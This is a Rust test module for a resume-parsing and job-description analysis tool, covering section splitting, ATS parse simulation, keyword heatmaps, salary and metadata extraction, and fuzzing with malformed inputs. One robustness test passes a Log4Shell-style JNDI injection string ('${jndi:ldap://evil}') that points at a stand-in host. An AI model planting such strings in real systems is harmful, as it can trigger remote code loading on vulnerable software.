
    const SPLIT_FIXTURE: &str = "Jane Doe\njane@example.com\n\nSUMMARY\nPlatform engineer with eight years of experience.\n\nEXPERIENCE\nStaff Engineer, Acme Corp, 2020-2024\nLed the migration of 40 services to Kubernetes.\nexperience working across teams daily.\n\nEDUCATION\nB.S. Computer Science, State University, 2016\n\nTECHNICAL SKILLS:\nGo, Kubernetes, PostgreSQL, Terraform";

    #[test]
    fn section_splitting_parity() {
        let sections = split_resume_into_sections(SPLIT_FIXTURE);
        let names: Vec<&str> = sections.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(
            names,
            vec!["Introduction", "Summary", "Experience", "Education", "Skills"]
        );
        let exp = sections.iter().find(|s| s.name == "Experience").unwrap();
        assert!(exp.text.contains("Acme Corp"));
        // The body line mentioning a header word stays body text.
        assert!(exp.text.contains("experience working across teams daily."));
        assert!(!exp.text.contains("State University"));
    }

    #[test]
    fn section_splitting_rejects_body_lines_and_normalizes_decorations() {
        let sections = split_resume_into_sections(
            "EXPERIENCE\nexperience with distributed systems\nskills in Python and Go\ngained experience leading teams",
        );
        assert_eq!(sections.len(), 1);
        assert_eq!(sections[0].name, "Experience");

        let decorated = split_resume_into_sections(
            "== WORK HISTORY ==\nbuilt things\n1. Education\ncollege\nSkills:\ncoding",
        );
        let names: Vec<&str> = decorated.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(names, vec!["Experience", "Education", "Skills"]);

        let extras = split_resume_into_sections(
            "== PUBLICATIONS ==\nNature paper.\n3. Certifications\nAWS SAA\nLeadership:\nChaired the guild.",
        );
        let extra_names: Vec<&str> = extras.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(
            extra_names,
            vec!["Publications", "Certifications", "Leadership"]
        );
        assert!(extras[0].text.contains("Nature paper."));
        assert!(!extras[0].text.contains("AWS SAA"));

        let aliases = split_resume_into_sections(
            "Honors & Awards\nBest paper.\nLicenses and Certifications\nAWS\nCommunity Service\nTutoring.",
        );
        let alias_names: Vec<&str> = aliases.iter().map(|s| s.name.as_str()).collect();
        assert_eq!(
            alias_names,
            vec!["Awards", "Certifications", "Volunteer"]
        );
        let edu = split_resume_into_sections("Education & Training\nMIT BSc.");
        assert_eq!(edu[0].name, "Education");
        assert!(edu[0].text.contains("MIT BSc."));
    }

    #[test]
    fn section_splitting_is_total_on_hostile_inputs() {
        assert!(split_resume_into_sections("").is_empty());
        let preamble = split_resume_into_sections("no headers at all\njust text");
        assert_eq!(preamble.len(), 1);
        assert_eq!(preamble[0].name, "Introduction");
        assert_eq!(preamble[0].text, "no headers at all\njust text");
        let crlf = split_resume_into_sections("SUMMARY\r\nshort\r\nEXPERIENCE\r\nwork\r\n");
        assert_eq!(crlf.len(), 2);
        assert_eq!(crlf[0].name, "Summary");
    }

    const PARSE_RESUME: &str = "Jane Doe\njane@example.com | +1 (415) 555-0100 x1234\nhttps://janedoe.dev https://github.com/janedoe\nSUMMARY\nPlatform engineer.\nEXPERIENCE\nStaff Engineer, Acme Corp, 2020-2024\nLed migration to Kubernetes.\nSKILLS\nGo, Kubernetes, PostgreSQL\nEDUCATION\nB.S. Computer Science, State University";

    #[test]
    fn parse_simulation_parity_workday() {
        let report = simulate_ats_parsing(PARSE_RESUME, AtsSystemId::Workday);
        let detected: Vec<&str> = report
            .sections
            .iter()
            .filter(|s| s.detected)
            .map(|s| s.name.as_str())
            .collect();
        assert!(detected.contains(&"summary"));
        assert!(detected.contains(&"experience"));
        assert!(detected.contains(&"education"));
        assert!(detected.contains(&"skills"));
        assert!(report.missing_required_sections.is_empty());
        assert_eq!(report.system, "workday");
        assert_eq!(report.contact_info.email.as_deref(), Some("jane@example.com"));
        assert_eq!(
            report.contact_info.phone.as_deref(),
            Some("+1 (415) 555-0100 x1234")
        );
        assert_eq!(report.contact_info.links.len(), 2);
        assert_eq!(report.contact_info.name.as_deref(), Some("Jane Doe"));
    }

    #[test]
    fn parse_simulation_reports_missing_required_sections() {
        let report = simulate_ats_parsing("SUMMARY\nJust a summary.", AtsSystemId::Workday);
        assert_eq!(report.missing_required_sections, vec!["education", "experience"]);
    }

    #[test]
    fn parse_simulation_flags_formatting_hazards() {
        let long_line = "x".repeat(140);
        let report = simulate_ats_parsing(
            &format!("SUMMARY\nA | B\tC\nEXPERIENCE\nDid \u{2728} great things\n{long_line}"),
            AtsSystemId::Generic,
        );
        assert!(report.warnings.iter().any(|w| w.to_lowercase().contains("table")));
        assert!(report.warnings.iter().any(|w| w.to_lowercase().contains("special")));
        assert!(report.warnings.iter().any(|w| w.to_lowercase().contains("long")));
    }

    #[test]
    fn phone_extraction_ignores_digit_garbage() {
        let report = simulate_ats_parsing(
            "EXPERIENCE\nReference 123456789012345678901234567890 invoice",
            AtsSystemId::Generic,
        );
        assert!(report.contact_info.phone.is_none());
    }

    #[test]
    fn parse_simulation_survives_hostile_payloads() {
        let long_nul = "\u{0}".repeat(1000);
        let long_parens = "((".repeat(500);
        let long_email = format!("{}@{}.com", "a".repeat(300), "b".repeat(300));
        let long_emoji = "\u{1f4de} \u{1f389}".repeat(100);
        let hostile = [
            "".to_string(),
            long_nul,
            long_parens,
            long_email,
            long_emoji,
        ];
        for payload in &hostile {
            let _ = simulate_ats_parsing(payload, AtsSystemId::Generic);
        }
        let tiny = simulate_ats_parsing("", AtsSystemId::Taleo);
        assert!(tiny.sections.iter().all(|s| !s.detected));
        assert!(tiny.warnings.is_empty());
    }

    const HEAT_JD: &str = "Requirements: deep Kubernetes operations and PostgreSQL tuning. Kafka streaming plus Terraform automation required. Kubernetes and Kafka experience preferred; Terraform and PostgreSQL a plus.";

    #[test]
    fn heatmap_parity() {
        let resume = "SUMMARY\nEngineer.\nEXPERIENCE\nRan Kubernetes in production and tuned PostgreSQL clusters.\nSKILLS\nKubernetes, PostgreSQL";
        let heat = generate_keyword_heatmap(resume, HEAT_JD);
        assert!(heat.sections.len() >= 3);
        let exp = heat.sections.iter().find(|s| s.name == "Experience").unwrap();
        let words: Vec<&str> = exp.keywords.iter().map(|k| k.word.as_str()).collect();
        assert!(words.contains(&"kubernetes"));
        assert!(words.contains(&"postgresql"));
        assert!(exp.heat_level >= 3);
        assert!(heat.overall_density > 0.0);
        let missing: Vec<&str> = heat
            .missing_critical_keywords
            .iter()
            .map(|s| s.as_str())
            .collect();
        assert!(missing.contains(&"kafka"));
        assert!(missing.contains(&"terraform"));
        assert!(!missing.contains(&"kubernetes"));
        assert!(!missing.contains(&"postgresql"));
        assert!(heat.overused_keywords.is_empty());
    }

    #[test]
    fn heatmap_flags_keyword_stuffing() {
        let jd = "Looking for dedicated platform engineers.";
        let stuffed = format!(
            "SKILLS\n{}",
            std::iter::repeat("platform engineers dedicated ")
                .take(40)
                .collect::<String>()
        );
        let heat = generate_keyword_heatmap(&stuffed, jd);
        assert_eq!(heat.overused_keywords.len(), 3);
        let skills = heat.sections.iter().find(|s| s.name == "Skills").unwrap();
        assert_eq!(skills.heat_level, 5);
    }

    #[test]
    fn heatmap_zero_cases_stay_cold() {
        let heat = generate_keyword_heatmap("", "");
        assert!(heat.sections.is_empty());
        assert_eq!(heat.overall_density, 0.0);
        assert!(heat.missing_critical_keywords.is_empty());
        assert!(heat.overused_keywords.is_empty());
    }

    const METADATA_JD: &str = "Position: Senior Platform Engineer\nCompany: ExampleCorp is seeking a platform specialist.\nLocation: Remote (US)\nPosted: 03/15/2026\nSalary: $120,000 - $150,000\nBenefits: 401(k), health insurance, unlimited PTO\nWe are a fast-paced, collaborative team with an ownership mindset.\nRequirements:\n- 5 years of Kubernetes\n- PostgreSQL tuning\nPreferred:\n* Terraform experience\nBonus:\n+ Rust knowledge";

    #[test]
    fn metadata_extraction_parity() {
        let meta = analyze_jd_metadata(METADATA_JD);
        assert_eq!(meta.job_title.as_deref(), Some("Senior Platform Engineer"));
        assert_eq!(meta.company.as_deref(), Some("ExampleCorp"));
        assert_eq!(meta.experience_level, Some(ExperienceLevel::Senior));
        assert_eq!(
            meta.salary_range,
            Some(SalaryRange {
                min: 120000.0,
                max: 150000.0,
                currency: "$".to_string()
            })
        );
        let summary = meta.salary_summary.unwrap_or_default();
        assert!(summary.contains("120,000"));
        for benefit in ["401(k)", "health insurance", "unlimited pto"] {
            assert!(meta.benefits.iter().any(|b| b == benefit));
        }
        for culture in ["fast-paced", "collaborative", "ownership"] {
            assert!(meta.culture_keywords.iter().any(|c| c == culture));
        }
        assert!(meta.requirements.must_have.join(" ").contains("Kubernetes"));
        assert!(meta.requirements.preferred.join(" ").contains("Terraform"));
        assert!(meta.requirements.bonus_skills.join(" ").contains("Rust"));
        assert_eq!(meta.posted_date.as_deref(), Some("03/15/2026"));
    }

    #[test]
    fn salary_ranges_never_report_inverted() {
        assert!(analyze_jd_metadata("Salary: $150,000 - $120,000").salary_range.is_none());
        let hourly = analyze_jd_metadata("Pay: $50-$60 an hour, part time");
        assert_eq!(hourly.salary_range.map(|r| r.min), Some(50.0));
    }

    #[test]
    fn experience_levels_across_phrasings() {
        let level = |jd: &str| analyze_jd_metadata(jd).experience_level;
        assert_eq!(level("VP of Engineering, Director level"), Some(ExperienceLevel::Executive));
        assert_eq!(level("Principal engineer wanted"), Some(ExperienceLevel::Lead));
        assert_eq!(level("Junior developer role"), Some(ExperienceLevel::Entry));
        assert_eq!(level("Graduate program 2026"), Some(ExperienceLevel::Entry));
        assert_eq!(level("Mid-level intermediate role"), Some(ExperienceLevel::Mid));
        assert_eq!(level("No signals here"), None);
    }

    #[test]
    fn metadata_is_total_on_hostile_inputs() {
        let nul_run = "\u{0}".repeat(500);
        for payload in ["", "((( ))) ${jndi:ldap://evil}"] {
            let _ = analyze_jd_metadata(payload);
        }
        let _ = analyze_jd_metadata(&nul_run);
        let meta = analyze_jd_metadata("");
        assert!(meta.job_title.is_none());
        assert!(meta.company.is_none());
        assert!(meta.requirements.must_have.is_empty());
    }

    #[test]
    fn requirement_buckets_bounded_on_pathological_jds() {
        let bullets: String = (0..5000).map(|i| format!("- req {i}\n")).collect();
        let meta = analyze_jd_metadata(&format!("Requirements:\n{bullets}"));
        assert!(meta.requirements.must_have.len() <= MAX_REQUIREMENTS_PER_BUCKET);
    }

    /// Seeded fuzz in the house style (`stress.rs`): every public entry point
    /// is total, deterministic, and keeps its outputs in range under hostile
    /// traffic built from the shared hostile corpora.
    #[test]
    fn ats_simulation_is_total_under_hostile_traffic() {
        let mut rng = crate::career_match::stress::Lcg::new(0xA75_1EE);
        for seed in 0..400u64 {
            let mut pieces: Vec<String> = Vec::new();
            for _ in 0..rng.below(12) {
                if rng.bool() {
                    pieces.push(crate::career_match::stress::hostile_string(&mut rng));
                } else {
                    pieces.push(
                        ["SUMMARY", "EXPERIENCE", "SKILLS:", "1. Education", "== WORK HISTORY =="]
                            [rng.below(5)]
                            .to_string(),
                    );
                }
                if rng.bool() {
                    pieces.push("kubernetes postgresql go c++ (remote)".to_string());
                }
            }
            let resume = if seed % 2 == 0 {
                pieces.join("\n")
            } else {
                pieces.join("\r\n")
            };
            let jd = crate::career_match::stress::hostile_jd(&mut rng);

            // Determinism first.
            let a = simulate_ats_parsing(&resume, AtsSystemId::Generic);
            let b = simulate_ats_parsing(&resume, AtsSystemId::Generic);
            assert_eq!(
                serde_json::to_string(&a).unwrap(),
                serde_json::to_string(&b).unwrap(),
                "seed {seed}: parse simulation must be deterministic"
            );

            let systems = detect_ats_systems(&jd);
            assert!(!systems.is_empty());

            let keywords = extract_jd_keywords(&jd, None);
            assert!(keywords.len() <= 30);
            for hit in &keywords {
                assert!(hit.count >= 1);
            }

            let heat = generate_keyword_heatmap(&resume, &jd);
            assert!(heat.overall_density.is_finite());
            for section in &heat.sections {
                assert!(section.density.is_finite());
                assert!(section.heat_level <= 5);
            }
            // Overused ⊆ extracted vocabulary; missing ⊆ high tier.
            for word in &heat.overused_keywords {
                assert!(keywords.iter().any(|k| &k.word == word));
            }

            let meta = analyze_jd_metadata(&jd);
            if let Some(range) = &meta.salary_range {
                assert!(range.max >= range.min, "seed {seed}: inverted salary range");
            }
            let summary = summarize_ats_parse(&a);
            assert_eq!(summary.sections.len(), SECTION_DEFS.len());
            let heat_summary = summarize_keyword_heatmap(&heat);
            assert_eq!(heat_summary.sections.len(), heat.sections.len());
        }
    }
}
